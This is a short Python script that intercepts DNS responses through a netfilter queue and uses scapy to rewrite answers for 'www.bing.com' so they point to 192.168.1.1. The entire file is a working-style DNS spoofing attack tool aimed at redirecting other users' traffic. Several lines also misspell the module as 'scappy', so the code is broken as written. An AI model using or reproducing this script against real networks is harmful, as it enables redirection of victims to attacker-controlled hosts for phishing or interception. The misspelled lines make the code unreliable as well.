#!/usr/bin/env python3
"""A simple script used to intercept and spoof DNS packets.
   Script uses Python 3"""

import scapy.all as scapy
import netfilterqueue


def process_packet(packet):
    """Processes the intercepted DNS packets and relays them to the target."""
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname.decode():
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.1')
            scapy_packet[scappy.DNS].an = answer
            scapy_packet[scappy.DNS].ancount = 1

            del scapy_packet[scappy.IP].len
            del scapy_packet[scappy.IP].chksum
            del scapy_packet[scappy.UDP].len
            del scapy_packet[scappy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()